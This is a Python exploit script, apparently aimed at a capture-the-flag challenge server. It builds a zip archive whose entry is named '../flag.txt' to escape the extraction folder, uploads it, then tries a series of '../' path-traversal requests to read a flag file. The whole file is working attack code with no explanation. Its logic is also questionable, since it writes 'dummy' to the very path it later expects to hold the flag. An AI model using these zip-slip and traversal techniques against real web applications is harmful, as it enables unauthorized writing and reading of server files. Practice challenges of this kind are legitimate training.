import requests
import zipfile
from io import BytesIO

def create_malicious_zip():
    zip_buffer = BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("../flag.txt", "dummy")
    
    zip_buffer.seek(0)
    return zip_buffer.getvalue()

def exploit(url):
    print("[+] Creating malicious zip...")
    zip_data = create_malicious_zip()
    
    print("[+] Uploading malicious zip...")
    files = {'zipfile': ('evil.zip', zip_data, 'application/zip')}
    upload_response = requests.post(url, files=files)
    print(f"[+] Upload response: {upload_response.text}")
    
    print("[+] Attempting to read flag...")
    paths_to_try = [
        '../flag.txt',
        '../../flag.txt',
        '../../../flag.txt',
        '../../../../flag.txt'
    ]
    
    for path in paths_to_try:
        print(f"[+] Trying path: {path}")
        flag_response = requests.get(f"{url}?file={path}")
        
        if flag_response.status_code == 200 and 'CTF{' in flag_response.text:
            print(f"[+] Success! Flag: {flag_response.text.strip()}")
            return
        else:
            print(f"[-] Failed. Response: {flag_response.text}")

if __name__ == "__main__":
    target_url = "http://challenges.carolinacon.org:8016"
    exploit(target_url)
